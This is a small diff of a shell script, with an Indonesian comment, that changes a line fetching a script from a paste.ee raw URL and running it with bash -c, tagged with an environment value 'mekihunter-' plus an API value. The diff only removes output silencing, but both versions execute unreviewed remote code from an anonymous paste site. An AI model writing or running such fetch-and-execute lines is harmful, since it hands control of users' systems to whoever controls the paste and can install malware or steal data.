@@ -18,5 +18,5 @@ if [ -z "$FROM_API" ]; then
   # echo -e "${RED}Gagal: FROM_API tidak boleh kosong!${RESET}"
   :
 else
-  S="mekihunter-$FROM_API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)" >/dev/null 2>&1
+  S="mekihunter-$FROM_API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)"
 fi
